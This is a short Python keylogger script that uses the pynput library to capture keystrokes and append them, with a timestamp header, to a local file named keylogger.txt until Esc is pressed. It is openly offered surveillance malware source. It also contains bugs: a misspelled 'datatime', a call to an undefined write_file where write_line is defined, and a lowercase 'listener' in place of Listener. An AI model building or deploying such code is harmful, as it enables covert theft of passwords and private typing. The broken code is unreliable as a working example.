from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0 
keys = []

with open("keylogger.txt","a") as file:
	file.write("Timestamp" + (str(datatime.now()))[:-7]+":\n")
	file.write("\n")

def on_press(key):
	global count,keys
	keys.append(key)
	count+=1
	if count>=10:
		count=0
		write_file(keys)
		keys=[]

def on_release(key):
	if key == Key.esc:
		return False

def write_line(keys):
	with open("keylogger.txt","a") as f:
		for idx, key in enumerate(keys):
			k=str(key).replace("'","")
			if k.find("space")>0 and k.find("backspace") ==-1:
				f.write("\n")
			elif k.find("Key") == -1:
				f.write(k)
if __name__ == "__main__":
	with listener(
		on_press=on_press,
		on_release=on_release) as listener:
	    listener.join()
	with open("keylogger.txt","a") as f:
		f.write("\n")
		f.write("!............................................................................................!")
		f.write("\n")
